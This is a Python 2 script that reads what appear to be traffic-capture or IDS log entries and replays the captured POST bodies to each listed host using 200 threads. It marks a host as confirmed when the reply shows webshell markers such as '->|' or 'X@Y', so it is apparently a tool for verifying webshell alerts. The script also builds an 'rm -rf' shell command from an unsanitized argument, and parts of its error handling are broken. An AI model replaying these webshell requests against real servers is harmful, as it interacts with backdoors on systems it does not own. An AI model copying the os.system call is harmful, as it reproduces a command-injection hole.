import requests
from concurrent.futures import ThreadPoolExecutor
import sys
import urllib2
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import os

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

host_r = re.compile(r'host=(.*?);')
url_r = re.compile(r'url=(?:https?\://[^/]+)?/+(.*?);')
pwd_r = re.compile(r';body0=(.*?);head1=')

def poc(data):
	try:
		host = re.findall(host_r,data)[0]
		url = re.findall(url_r,data)[0]
		pwd = re.findall(pwd_r,data)[0]
		pwd = pwd.replace('\\','%')
	except:
		pass

	
	if url != "":
		try:
			req = urllib2.Request('http://' + host + '/' + url,data = pwd)
			rep = urllib2.urlopen(req,timeout=2)
			
			
		except:
			try:
				req = urllib2.Request('https://' + host + '/' + url,data = pwd)
				rep = urllib2.urlopen(req,timeout=2)
			except:
				print data.strip() + '\t' +'---false---'
		
		finally:
			if rep != '':
				html = rep.read()
				if rep.code == 200 and ('->|' in html or 'X@Y' in html or '[S]' in html or '%%x2D%%x3E%%x7C' in html):
					print data.strip() + '\t' +'---true---' 
				else:
					print data.strip() + '\t' +'---false---'
	else:
		pass
		


def exp(f_name):

	with open(f_name,'r+') as f:
		
		with ThreadPoolExecutor(200) as executor:
			for each in f:
				info = each.strip()
				executor.submit(poc,info)
		
def add_data():
	os.system("grep 'false' 1.log|awk -F\"\t\" '{print $7}'|awk -F\";head0=\" '{print $1}'|sed 's/;url=\/\+/ /g'|sed 's/host=//g'|sort|uniq -c > temp.dat")
	with open(sys.argv[2] + '.dat','a+') as fff:
		with open(sys.argv[2],'r+') as ff:
			for i in ff:
				if "---true---" in i:
					fff.write(i)
				else:
					with open("temp.dat",'r+') as lines:
						for line in lines:							
							if int(line.strip().split(' ')[0]) > 5:
								if line.split(' ')[1] in i and line.split(' ')[2] in i:
									fff.write(i.replace('---false---','---true---'))
									break
	os.system('rm -rf temp.dat')
	os.system('rm -rf ' + sys.argv[2])
						
			

if __name__ == "__main__":
	exp(sys.argv[1])
	add_data()
	
	
	
